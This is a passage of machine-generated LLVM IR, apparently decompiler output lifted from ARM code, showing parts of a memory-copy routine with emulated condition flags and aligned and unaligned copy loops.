dec_label_pc_157d4:                               ; preds = %dec_label_pc_157bc
  %v1_157d4 = add i32 %v0_157cc, -16
  %v3_157d4 = add i32 %v0_157cc, 2147483616
  %v4_157d4 = and i32 %v1_157d4, %v3_157d4
  %v5_157d4 = icmp slt i32 %v4_157d4, 0
  store i1 %v5_157d4, i1* %cpsr_v.global-to-local, align 1
  %v6_157d4 = icmp slt i32 %v1_157d4, 0
  store i1 %v6_157d4, i1* %cpsr_n.global-to-local, align 1
  %v7_157d4 = icmp eq i32 %v1_157d4, 0
  store i1 %v7_157d4, i1* %cpsr_z.global-to-local, align 1
  %v2_157d8 = xor i1 %v6_157d4, %v5_157d4
  br i1 %v2_157d8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_157d4
  %v3_157d8 = load i32, i32* @r1, align 4
  %v4_157d8 = inttoptr i32 %v3_157d8 to i32*
  %v5_157d8 = load i32, i32* %v4_157d8, align 4
  store i32 %v5_157d8, i32* @r3, align 4
  %v6_157d8 = add i32 %v3_157d8, 4
  %v7_157d8 = inttoptr i32 %v6_157d8 to i32*
  %v8_157d8 = load i32, i32* %v7_157d8, align 4
  store i32 %v8_157d8, i32* %r4.global-to-local, align 4
  %v9_157d8 = add i32 %v3_157d8, 8
  %v10_157d8 = inttoptr i32 %v9_157d8 to i32*
  %v11_157d8 = load i32, i32* %v10_157d8, align 4
  store i32 %v11_157d8, i32* @ip, align 4
  %v12_157d8 = add i32 %v3_157d8, 12
  %v13_157d8 = inttoptr i32 %v12_157d8 to i32*
  %v14_157d8 = load i32, i32* %v13_157d8, align 4
  store i32 %v14_157d8, i32* %lr.global-to-local, align 4
  %v15_157d8 = add i32 %v3_157d8, 16
  store i32 %v15_157d8, i32* @r1, align 4
  %v4_157dc = inttoptr i32 %v12_157c8 to i32*
  store i32 %v5_157d8, i32* %v4_157dc, align 4
  %v6_157dc = add i32 %v0_157c0, 36
  %v7_157dc = inttoptr i32 %v6_157dc to i32*
  %v8_157dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_157dc, i32* %v7_157dc, align 4
  %v9_157dc = add i32 %v0_157c0, 40
  %v10_157dc = inttoptr i32 %v9_157dc to i32*
  %v11_157dc = load i32, i32* @ip, align 4
  store i32 %v11_157dc, i32* %v10_157dc, align 4
  %v12_157dc = add i32 %v0_157c0, 44
  %v13_157dc = inttoptr i32 %v12_157dc to i32*
  %v14_157dc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_157dc, i32* %v13_157dc, align 4
  %v15_157dc = add i32 %v0_157c0, 48
  store i32 %v15_157dc, i32* @r0, align 4
  %v3_157e0 = load i32, i32* %r2.global-to-local, align 4
  %v4_157e0 = add i32 %v3_157e0, -16
  store i32 %v4_157e0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_157d4, %bb136
  %v3_157f0102111 = phi i32 [ %v15_157dc, %bb136 ], [ %v12_157c8, %dec_label_pc_157d4 ]
  %v0_157e8.pre = phi i32 [ %v4_157e0, %bb136 ], [ %v1_157cc, %dec_label_pc_157d4 ]
  %v2_157e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_157e4, i32* @r4, align 4
  br label %dec_label_pc_157e8

dec_label_pc_157e8:                               ; preds = %dec_label_pc_157b0, %bb137
  %v3_157f0101 = phi i32 [ %v0_157c094, %dec_label_pc_157b0 ], [ %v3_157f0102111, %bb137 ]
  %v0_157e8 = phi i32 [ %v1_157b0, %dec_label_pc_157b0 ], [ %v0_157e8.pre, %bb137 ]
  %v1_157e8 = add i32 %v0_157e8, 20
  store i32 %v1_157e8, i32* %r2.global-to-local, align 4
  %v3_157e8 = sub i32 0, %v0_157e8
  %v4_157e8 = and i32 %v1_157e8, %v3_157e8
  %v5_157e8 = icmp slt i32 %v4_157e8, 0
  store i1 %v5_157e8, i1* %cpsr_v.global-to-local, align 1
  %v6_157e8 = icmp slt i32 %v1_157e8, 0
  store i1 %v6_157e8, i1* %cpsr_n.global-to-local, align 1
  %v7_157e8 = icmp eq i32 %v1_157e8, 0
  store i1 %v7_157e8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_157ec

dec_label_pc_157ec:                               ; preds = %.thread115, %dec_label_pc_157e8
  %v0_157fc.pre157 = phi i32 [ %v0_157fc.pre, %.thread115 ], [ %v1_157e8, %dec_label_pc_157e8 ]
  %v3_157f0 = phi i32 [ %v3_157f099116, %.thread115 ], [ %v3_157f0101, %dec_label_pc_157e8 ]
  %v1_157f4 = phi i1 [ %v1_157f8, %.thread115 ], [ %v5_157e8, %dec_label_pc_157e8 ]
  %v0_157f4 = phi i1 [ %v0_157f8, %.thread115 ], [ %v6_157e8, %dec_label_pc_157e8 ]
  %v2_157ec = xor i1 %v1_157f4, %v0_157f4
  br i1 %v2_157ec, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_157ec
  %v3_157ec = load i32, i32* @r1, align 4
  %v4_157ec = inttoptr i32 %v3_157ec to i32*
  %v5_157ec = load i32, i32* %v4_157ec, align 4
  store i32 %v5_157ec, i32* @r3, align 4
  %v6_157ec = add i32 %v3_157ec, 4
  %v7_157ec = inttoptr i32 %v6_157ec to i32*
  %v8_157ec = load i32, i32* %v7_157ec, align 4
  store i32 %v8_157ec, i32* @ip, align 4
  %v9_157ec = add i32 %v3_157ec, 8
  %v10_157ec = inttoptr i32 %v9_157ec to i32*
  %v11_157ec = load i32, i32* %v10_157ec, align 4
  store i32 %v11_157ec, i32* %lr.global-to-local, align 4
  %v12_157ec = add i32 %v3_157ec, 12
  store i32 %v12_157ec, i32* @r1, align 4
  %v4_157f0 = inttoptr i32 %v3_157f0 to i32*
  store i32 %v5_157ec, i32* %v4_157f0, align 4
  %v6_157f0 = add i32 %v3_157f0, 4
  %v7_157f0 = inttoptr i32 %v6_157f0 to i32*
  %v8_157f0 = load i32, i32* @ip, align 4
  store i32 %v8_157f0, i32* %v7_157f0, align 4
  %v9_157f0 = add i32 %v3_157f0, 8
  %v10_157f0 = inttoptr i32 %v9_157f0 to i32*
  %v11_157f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_157f0, i32* %v10_157f0, align 4
  %v12_157f0 = add i32 %v3_157f0, 12
  store i32 %v12_157f0, i32* @r0, align 4
  %v3_157f4 = load i32, i32* %r2.global-to-local, align 4
  %v4_157f4 = add i32 %v3_157f4, -12
  store i32 %v4_157f4, i32* %r2.global-to-local, align 4
  %v6_157f4 = sub i32 11, %v3_157f4
  %v7_157f4 = and i32 %v6_157f4, %v3_157f4
  %v8_157f4 = icmp slt i32 %v7_157f4, 0
  store i1 %v8_157f4, i1* %cpsr_v.global-to-local, align 1
  %v9_157f4 = icmp slt i32 %v4_157f4, 0
  store i1 %v9_157f4, i1* %cpsr_n.global-to-local, align 1
  %v10_157f4 = icmp eq i32 %v3_157f4, 12
  store i1 %v10_157f4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_157ec, %bb138
  %v0_157fc.pre = phi i32 [ %v4_157f4, %bb138 ], [ %v0_157fc.pre157, %dec_label_pc_157ec ]
  %v3_157f099116 = phi i32 [ %v12_157f0, %bb138 ], [ %v3_157f0, %dec_label_pc_157ec ]
  %v1_157f8 = phi i1 [ %v8_157f4, %bb138 ], [ %v1_157f4, %dec_label_pc_157ec ]
  %v0_157f8 = phi i1 [ %v9_157f4, %bb138 ], [ %v0_157f4, %dec_label_pc_157ec ]
  %v2_157f8 = xor i1 %v1_157f8, %v0_157f8
  br i1 %v2_157f8, label %dec_label_pc_157fc, label %dec_label_pc_157ec

dec_label_pc_157fc:                               ; preds = %.thread115, %dec_label_pc_157a8
  %v4_1580c = phi i32 [ %v0_157c094, %dec_label_pc_157a8 ], [ %v3_157f099116, %.thread115 ]
  %v0_157fc = phi i32 [ %v1_157a8, %dec_label_pc_157a8 ], [ %v0_157fc.pre, %.thread115 ]
  %v1_157fc = add i32 %v0_157fc, 8
  store i32 %v1_157fc, i32* %r2.global-to-local, align 4
  %v3_157fc = sub i32 0, %v0_157fc
  %v4_157fc = and i32 %v1_157fc, %v3_157fc
  %v5_157fc = icmp slt i32 %v4_157fc, 0
  store i1 %v5_157fc, i1* %cpsr_v.global-to-local, align 1
  %v6_157fc = icmp slt i32 %v1_157fc, 0
  store i1 %v6_157fc, i1* %cpsr_n.global-to-local, align 1
  %v7_157fc = icmp eq i32 %v1_157fc, 0
  store i1 %v7_157fc, i1* %cpsr_z.global-to-local, align 1
  %v2_15800 = xor i1 %v6_157fc, %v5_157fc
  br i1 %v2_15800, label %bb140, label %dec_label_pc_15804

dec_label_pc_15804:                               ; preds = %dec_label_pc_157fc
  %v1_15804 = add i32 %v0_157fc, 4
  store i32 %v1_15804, i32* %r2.global-to-local, align 4
  %v3_15804 = sub i32 -5, %v0_157fc
  %v4_15804 = and i32 %v3_15804, %v1_157fc
  %v5_15804 = icmp slt i32 %v4_15804, 0
  store i1 %v5_15804, i1* %cpsr_v.global-to-local, align 1
  %v6_15804 = icmp slt i32 %v1_15804, 0
  store i1 %v6_15804, i1* %cpsr_n.global-to-local, align 1
  %v7_15804 = icmp eq i32 %v1_157fc, 4
  store i1 %v7_15804, i1* %cpsr_z.global-to-local, align 1
  %v2_15808 = xor i1 %v6_15804, %v5_15804
  %v3_15808 = load i32, i32* @r1, align 4
  %v4_15808 = inttoptr i32 %v3_15808 to i32*
  %v5_15808 = load i32, i32* %v4_15808, align 4
  store i32 %v5_15808, i32* @r3, align 4
  %v7_15808 = add i32 %v3_15808, 4
  br i1 %v2_15808, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_15804
  store i32 %v7_15808, i32* @r1, align 4
  %v5_1580c = inttoptr i32 %v4_1580c to i32*
  store i32 %v5_15808, i32* %v5_1580c, align 4
  %v6_1580c = load i32, i32* @r0, align 4
  %v7_1580c = add i32 %v6_1580c, 4
  store i32 %v7_1580c, i32* @r0, align 4
  %v0_1581c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_15804
  %v7_15810 = inttoptr i32 %v7_15808 to i32*
  %v8_15810 = load i32, i32* %v7_15810, align 4
  store i32 %v8_15810, i32* @ip, align 4
  %v9_15810 = add i32 %v3_15808, 8
  store i32 %v9_15810, i32* @r1, align 4
  %v4_15814 = inttoptr i32 %v4_1580c to i32*
  store i32 %v5_15808, i32* %v4_15814, align 4
  %v6_15814 = add i32 %v4_1580c, 4
  %v7_15814 = inttoptr i32 %v6_15814 to i32*
  %v8_15814 = load i32, i32* @ip, align 4
  store i32 %v8_15814, i32* %v7_15814, align 4
  %v9_15814 = add i32 %v4_1580c, 8
  store i32 %v9_15814, i32* @r0, align 4
  %v3_15818 = load i32, i32* %r2.global-to-local, align 4
  %v4_15818 = add i32 %v3_15818, -4
  store i32 %v4_15818, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_157fc, %bb, %dec_label_pc_159cc, %dec_label_pc_15960, %dec_label_pc_158f4, %bb139
  %v0_1581c = phi i32 [ %v0_1581c.pre, %.thread122 ], [ %v2_1586c, %.thread128 ], [ %v1_157fc, %dec_label_pc_157fc ], [ %v2_15790, %bb ], [ %v0_1581c61, %dec_label_pc_159cc ], [ %v0_1581c60, %dec_label_pc_15960 ], [ %v0_1581c59, %dec_label_pc_158f4 ], [ %v4_15818, %bb139 ]
  %v1_1581c = add i32 %v0_1581c, 4
  store i32 %v1_1581c, i32* %r2.global-to-local, align 4
  %v3_1581c = sub i32 0, %v0_1581c
  %v4_1581c = and i32 %v1_1581c, %v3_1581c
  %v5_1581c = icmp slt i32 %v4_1581c, 0
  store i1 %v5_1581c, i1* %cpsr_v.global-to-local, align 1
  %v6_1581c = icmp slt i32 %v1_1581c, 0
  store i1 %v6_1581c, i1* %cpsr_n.global-to-local, align 1
  %v7_1581c = icmp eq i32 %v1_1581c, 0
  store i1 %v7_1581c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1581c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_15824.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_15820 = load i8*, i8** %stack_var_-8, align 4
  %v4_15820 = ptrtoint i8* %v3_15820 to i32
  store i32 %v4_15820, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_15824 = phi i32 [ %v0_15824.pre, %bb140.bb142_crit_edge ], [ %v8_1578c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1581c, i32 %v0_15824)
  %v0_15828 = load i32, i32* %r2.global-to-local, align 4
  %v1_15828 = add i32 %v0_15828, -2
  %v3_15828 = sub i32 1, %v0_15828
  %v4_15828 = and i32 %v3_15828, %v0_15828
  %v5_15828 = icmp slt i32 %v4_15828, 0
  store i1 %v5_15828, i1* %cpsr_v.global-to-local, align 1
  %v6_15828 = icmp slt i32 %v1_15828, 0
  store i1 %v6_15828, i1* %cpsr_n.global-to-local, align 1
  %v7_15828 = icmp eq i32 %v0_15828, 2
  store i1 %v7_15828, i1* %cpsr_z.global-to-local, align 1
  %v0_1582c = load i32, i32* @r1, align 4
  %v1_1582c = inttoptr i32 %v0_1582c to i8*
  %v2_1582c = load i8, i8* %v1_1582c, align 1
  %v5_1582c = add i32 %v0_1582c, 1
  store i32 %v5_1582c, i32* %r1.global-to-local, align 4
  %v2_15830 = load i32, i32* @r0, align 4
  %v3_15830 = inttoptr i32 %v2_15830 to i8*
  store i8 %v2_1582c, i8* %v3_15830, align 1
  %v4_15830 = load i32, i32* @r0, align 4
  %v5_15830 = add i32 %v4_15830, 1
  store i32 %v5_15830, i32* %r0.global-to-local, align 4
  %v0_15834 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15834 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15834 = xor i1 %v0_15834, %v1_15834
  br i1 %v2_15834, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_15834 = load i32, i32* %r1.global-to-local, align 4
  %v4_15834 = inttoptr i32 %v3_15834 to i8*
  %v5_15834 = load i8, i8* %v4_15834, align 1
  %v8_15834 = add i32 %v3_15834, 1
  store i32 %v8_15834, i32* %r1.global-to-local, align 4
  %v6_15838 = inttoptr i32 %v5_15830 to i8*
  store i8 %v5_15834, i8* %v6_15838, align 1
  %v7_15838 = load i32, i32* %r0.global-to-local, align 4
  %v8_15838 = add i32 %v7_15838, 1
  store i32 %v8_15838, i32* %r0.global-to-local, align 4
  %v1_1583c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1583c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_15840 = phi i32 [ %v8_15838, %bb143 ], [ %v5_15830, %bb142 ]
  %v2_15840 = phi i1 [ %v2_1583c.pre, %bb143 ], [ %v1_15834, %bb142 ]
  %v1_15840 = phi i1 [ %v1_1583c.pre, %bb143 ], [ %v0_15834, %bb142 ]
  %v0_1583c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1583c = xor i1 %v2_15840, %v1_15840
  %v4_1583c = or i1 %v0_1583c, %v3_1583c
  br i1 %v4_1583c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1583c = load i32, i32* %r1.global-to-local, align 4
  %v6_1583c = inttoptr i32 %v5_1583c to i8*
  %v7_1583c = load i8, i8* %v6_1583c, align 1
  %v10_1583c = add i32 %v5_1583c, 1
  store i32 %v10_1583c, i32* %r1.global-to-local, align 4
  %v8_15840 = inttoptr i32 %v7_15840 to i8*
  store i8 %v7_1583c, i8* %v8_15840, align 1
  %v9_15840 = load i32, i32* %r0.global-to-local, align 4
  %v10_15840 = add i32 %v9_15840, 1
  store i32 %v10_15840, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_15844 = load i8*, i8** %stack_var_-8, align 4
  %v3_15844 = ptrtoint i8* %v2_15844 to i32
  store i32 %v3_15844, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_1578c)
  %v0_1584c.pre = load i32, i32* @ip, align 4
  %v0_15854.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_15858.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1584c

dec_label_pc_1584c:                               ; preds = %dec_label_pc_15798, %.thread126
  %v2_15858 = phi i32 [ %v1_15780, %dec_label_pc_15798 ], [ %v2_15858.pre, %.thread126 ]
  %v0_15854 = phi i32 [ %v0_15780, %dec_label_pc_15798 ], [ %v0_15854.pre, %.thread126 ]
  %v0_1584c = phi i32 [ %v1_15798, %dec_label_pc_15798 ], [ %v0_1584c.pre, %.thread126 ]
  %v1_1584c = sub i32 4, %v0_1584c
  store i32 %v1_1584c, i32* @ip, align 4
  %v1_15850 = add i32 %v1_1584c, -2
  %v3_15850 = sub i32 1, %v1_1584c
  %v4_15850 = and i32 %v3_15850, %v1_1584c
  %v5_15850 = icmp slt i32 %v4_15850, 0
  store i1 %v5_15850, i1* %cpsr_v.global-to-local, align 1
  %v6_15850 = icmp slt i32 %v1_15850, 0
  store i1 %v6_15850, i1* %cpsr_n.global-to-local, align 1
  %v7_15850 = icmp eq i32 %v1_1584c, 2
  store i1 %v7_15850, i1* %cpsr_z.global-to-local, align 1
  %v1_15854 = inttoptr i32 %v0_15854 to i8*
  %v2_15854 = load i8, i8* %v1_15854, align 1
  %v3_15854 = zext i8 %v2_15854 to i32
  store i32 %v3_15854, i32* @r3, align 4
  %v5_15854 = add i32 %v0_15854, 1
  store i32 %v5_15854, i32* @r1, align 4
  %v3_15858 = inttoptr i32 %v2_15858 to i8*
  store i8 %v2_15854, i8* %v3_15858, align 1
  %v4_15858 = load i32, i32* @r0, align 4
  %v5_15858 = add i32 %v4_15858, 1
  store i32 %v5_15858, i32* @r0, align 4
  %v0_1585c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1585c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1585c = xor i1 %v0_1585c, %v1_1585c
  br i1 %v2_1585c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1584c
  %v3_1585c = load i32, i32* @r1, align 4
  %v4_1585c = inttoptr i32 %v3_1585c to i8*
  %v5_1585c = load i8, i8* %v4_1585c, align 1
  %v6_1585c = zext i8 %v5_1585c to i32
  store i32 %v6_1585c, i32* @r3, align 4
  %v8_1585c = add i32 %v3_1585c, 1
  store i32 %v8_1585c, i32* @r1, align 4
  %v6_15860 = inttoptr i32 %v5_15858 to i8*
  store i8 %v5_1585c, i8* %v6_15860, align 1
  %v7_15860 = load i32, i32* @r0, align 4
  %v8_15860 = add i32 %v7_15860, 1
  store i32 %v8_15860, i32* @r0, align 4
  %v1_15864.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15864.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1584c, %bb145
  %v7_15868 = phi i32 [ %v8_15860, %bb145 ], [ %v5_15858, %dec_label_pc_1584c ]
  %v2_15868 = phi i1 [ %v2_15864.pre, %bb145 ], [ %v1_1585c, %dec_label_pc_1584c ]
  %v1_15868 = phi i1 [ %v1_15864.pre, %bb145 ], [ %v0_1585c, %dec_label_pc_1584c ]
  %v0_15864 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15864 = xor i1 %v2_15868, %v1_15868
  %v4_15864 = or i1 %v0_15864, %v3_15864
  br i1 %v4_15864, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_15864 = load i32, i32* @r1, align 4
  %v6_15864 = inttoptr i32 %v5_15864 to i8*
  %v7_15864 = load i8, i8* %v6_15864, align 1
  %v8_15864 = zext i8 %v7_15864 to i32
  store i32 %v8_15864, i32* @r3, align 4
  %v10_15864 = add i32 %v5_15864, 1
  store i32 %v10_15864, i32* @r1, align 4
  %v8_15868 = inttoptr i32 %v7_15868 to i8*
  store i8 %v7_15864, i8* %v8_15868, align 1
  %v9_15868 = load i32, i32* @r0, align 4
  %v10_15868 = add i32 %v9_15868, 1
  store i32 %v10_15868, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_1599c77 = phi i32 [ %v10_15868, %bb146 ], [ %v7_15868, %.thread127 ]
  %v0_1586c = load i32, i32* %r2.global-to-local, align 4
  %v1_1586c = load i32, i32* @ip, align 4
  %v2_1586c = sub i32 %v0_1586c, %v1_1586c
  store i32 %v2_1586c, i32* %r2.global-to-local, align 4
  %v4_1586c = xor i32 %v1_1586c, %v0_1586c
  %v5_1586c = xor i32 %v2_1586c, %v0_1586c
  %v6_1586c = and i32 %v5_1586c, %v4_1586c
  %v7_1586c = icmp slt i32 %v6_1586c, 0
  store i1 %v7_1586c, i1* %cpsr_v.global-to-local, align 1
  %v8_1586c = icmp slt i32 %v2_1586c, 0
  store i1 %v8_1586c, i1* %cpsr_n.global-to-local, align 1
  %v9_1586c = icmp eq i32 %v0_1586c, %v1_1586c
  store i1 %v9_1586c, i1* %cpsr_z.global-to-local, align 1
  %v2_15870 = xor i1 %v8_1586c, %v7_1586c
  br i1 %v2_15870, label %bb140, label %dec_label_pc_15874

dec_label_pc_15874:                               ; preds = %.thread128
  %v0_15874 = load i32, i32* @r1, align 4
  %v1_15874 = urem i32 %v0_15874, 4
  store i32 %v1_15874, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15874 = icmp eq i32 %v1_15874, 0
  store i1 %v2_15874, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_15874 to i2
  br i1 %v2_15874, label %dec_label_pc_157a8, label %dec_label_pc_1587c

dec_label_pc_1587c:                               ; preds = %dec_label_pc_157a0, %dec_label_pc_15874
  %v0_1599c76 = phi i32 [ %v1_15780, %dec_label_pc_157a0 ], [ %v0_1599c77, %dec_label_pc_15874 ]
  %v0_15904 = phi i32 [ %v2_15790, %dec_label_pc_157a0 ], [ %v2_1586c, %dec_label_pc_15874 ]
  %v0_15884.off0 = phi i2 [ %extract.t, %dec_label_pc_157a0 ], [ %extract.t131, %dec_label_pc_15874 ]
  %v0_1587c = phi i32 [ %v0_15780, %dec_label_pc_157a0 ], [ %v0_15874, %dec_label_pc_15874 ]
  %v1_1587c = and i32 %v0_1587c, -4
  store i32 %v1_1587c, i32* %r1.global-to-local, align 4
  %v1_15880 = inttoptr i32 %v1_1587c to i32*
  %v2_15880 = load i32, i32* %v1_15880, align 4
  store i32 %v2_15880, i32* %lr.global-to-local, align 4
  %v4_15880 = add i32 %v1_1587c, 4
  store i32 %v4_15880, i32* %r1.global-to-local, align 4
  %v1_158fc = add i32 %v0_15904, -12
  %v3_158fc = sub i32 11, %v0_15904
  %v4_158fc = and i32 %v3_158fc, %v0_15904
  %v5_158fc = icmp slt i32 %v4_158fc, 0
  store i1 %v5_158fc, i1* %cpsr_v.global-to-local, align 1
  %v6_158fc = icmp slt i32 %v1_158fc, 0
  store i1 %v6_158fc, i1* %cpsr_n.global-to-local, align 1
  %v7_158fc = icmp eq i32 %v0_15904, 12
  store i1 %v7_158fc, i1* %cpsr_z.global-to-local, align 1
  %v2_15900 = xor i1 %v6_158fc, %v5_158fc
  switch i2 %v0_15884.off0, label %dec_label_pc_15890 [
    i2 -1, label %dec_label_pc_15968
    i2 -2, label %dec_label_pc_158fc
  ]

dec_label_pc_15890:                               ; preds = %dec_label_pc_1587c
  br i1 %v2_15900, label %dec_label_pc_158dc, label %dec_label_pc_15898

dec_label_pc_15898:                               ; preds = %dec_label_pc_15890
  store i32 %v1_158fc, i32* %r2.global-to-local, align 4
  %v3_1589c = load i32, i32* @r4, align 4
  store i32 %v3_1589c, i32* %stack_var_-16, align 4
  %v6_1589c = load i32, i32* @r5, align 4
  store i32 %v6_1589c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_158a0

dec_label_pc_158a0:                               ; preds = %dec_label_pc_158a0.dec_label_pc_158a0_crit_edge, %dec_label_pc_15898
  %v0_158c4 = phi i32 [ %v12_158c4, %dec_label_pc_158a0.dec_label_pc_158a0_crit_edge ], [ %v0_1599c76, %dec_label_pc_15898 ]
  %v0_158a4 = phi i32 [ %v0_158a4.pre, %dec_label_pc_158a0.dec_label_pc_158a0_crit_edge ], [ %v4_15880, %dec_label_pc_15898 ]
  %v0_158a0 = phi i32 [ %v0_158a0.pre, %dec_label_pc_158a0.dec_label_pc_158a0_crit_edge ], [ %v2_15880, %dec_label_pc_15898 ]
  %v3_158a0 = udiv i32 %v0_158a0, 256
  %v1_158a4 = inttoptr i32 %v0_158a4 to i32*
  %v2_158a4 = load i32, i32* %v1_158a4, align 4
  store i32 %v2_158a4, i32* %r4.global-to-local, align 4
  %v3_158a4 = add i32 %v0_158a4, 4
  %v4_158a4 = inttoptr i32 %v3_158a4 to i32*
  %v5_158a4 = load i32, i32* %v4_158a4, align 4
  store i32 %v5_158a4, i32* %r5.global-to-local, align 4
  %v6_158a4 = add i32 %v0_158a4, 8
  %v7_158a4 = inttoptr i32 %v6_158a4 to i32*
  %v8_158a4 = load i32, i32* %v7_158a4, align 4
  store i32 %v8_158a4, i32* %ip.global-to-local, align 4
  %v9_158a4 = add i32 %v0_158a4, 12
  %v10_158a4 = inttoptr i32 %v9_158a4 to i32*
  %v11_158a4 = load i32, i32* %v10_158a4, align 4
  store i32 %v11_158a4, i32* %lr.global-to-local, align 4
  %v12_158a4 = add i32 %v0_158a4, 16
  store i32 %v12_158a4, i32* %r1.global-to-local, align 4
  %v4_158a8 = mul i32 %v2_158a4, 16777216
  %v5_158a8 = or i32 %v4_158a8, %v3_158a0
  store i32 %v5_158a8, i32* @r3, align 4
  %v3_158ac = udiv i32 %v2_158a4, 256
  %v4_158b0 = mul i32 %v5_158a4, 16777216
  %v5_158b0 = or i32 %v4_158b0, %v3_158ac
  store i32 %v5_158b0, i32* %r4.global-to-local, align 4
  %v3_158b4 = udiv i32 %v5_158a4, 256
  %v4_158b8 = mul i32 %v8_158a4, 16777216
  %v5_158b8 = or i32 %v4_158b8, %v3_158b4
  store i32 %v5_158b8, i32* %r5.global-to-local, align 4
  %v3_158bc = udiv i32 %v8_158a4, 256
  %v4_158c0 = mul i32 %v11_158a4, 16777216
  %v5_158c0 = or i32 %v4_158c0, %v3_158bc
  store i32 %v5_158c0, i32* @ip, align 4
  %v1_158c4 = inttoptr i32 %v0_158c4 to i32*
  store i32 %v5_158a8, i32* %v1_158c4, align 4
  %v3_158c4 = add i32 %v0_158c4, 4
  %v4_158c4 = inttoptr i32 %v3_158c4 to i32*
  %v5_158c4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_158c4, i32* %v4_158c4, align 4
  %v6_158c4 = add i32 %v0_158c4, 8
  %v7_158c4 = inttoptr i32 %v6_158c4 to i32*
  %v8_158c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_158c4, i32* %v7_158c4, align 4
  %v9_158c4 = add i32 %v0_158c4, 12
  %v10_158c4 = inttoptr i32 %v9_158c4 to i32*
  %v11_158c4 = load i32, i32* @ip, align 4
  store i32 %v11_158c4, i32* %v10_158c4, align 4
  %v12_158c4 = add i32 %v0_158c4, 16
  store i32 %v12_158c4, i32* @r0, align 4
  %v0_158c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_158c8 = add i32 %v0_158c8, -16
  store i32 %v1_158c8, i32* %r2.global-to-local, align 4
  %v3_158c8 = sub i32 15, %v0_158c8
  %v4_158c8 = and i32 %v3_158c8, %v0_158c8
  %v5_158c8 = icmp slt i32 %v4_158c8, 0
  %v6_158c8 = icmp slt i32 %v1_158c8, 0
  %v2_158cc = xor i1 %v6_158c8, %v5_158c8
  br i1 %v2_158cc, label %dec_label_pc_158d0, label %dec_label_pc_158a0.dec_label_pc_158a0_crit_edge

dec_label_pc_158a0.dec_label_pc_158a0_crit_edge:  ; preds = %dec_label_pc_158a0
  %v0_158a0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_158a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_158a0

dec_label_pc_158d0:                               ; preds = %dec_label_pc_158a0
  %v2_158d0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_158d0, i32* @r4, align 4
  %v5_158d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_158d0, i32* @r5, align 4
  %v1_158d4 = add i32 %v0_158c8, -4
  store i32 %v1_158d4, i32* %r2.global-to-local, align 4
  %v3_158d4 = add i32 %v0_158c8, 2147483632
  %v4_158d4 = and i32 %v1_158d4, %v3_158d4
  %v5_158d4 = icmp slt i32 %v4_158d4, 0
  store i1 %v5_158d4, i1* %cpsr_v.global-to-local, align 1
  %v6_158d4 = icmp slt i32 %v1_158d4, 0
  store i1 %v6_158d4, i1* %cpsr_n.global-to-local, align 1
  %v7_158d4 = icmp eq i32 %v1_158d4, 0
  store i1 %v7_158d4, i1* %cpsr_z.global-to-local, align 1
  %v2_158d8 = xor i1 %v6_158d4, %v5_158d4
  br i1 %v2_158d8, label %dec_label_pc_158f4, label %dec_label_pc_158dc

dec_label_pc_158dc:                               ; preds = %dec_label_pc_158d0, %dec_label_pc_15890, %dec_label_pc_158dc
  %v1_158e8 = phi i32 [ %v4_158e8, %dec_label_pc_158dc ], [ %v12_158c4, %dec_label_pc_158d0 ], [ %v0_1599c76, %dec_label_pc_15890 ]
  %v0_158dc = load i32, i32* %lr.global-to-local, align 4
  %v3_158dc = udiv i32 %v0_158dc, 256
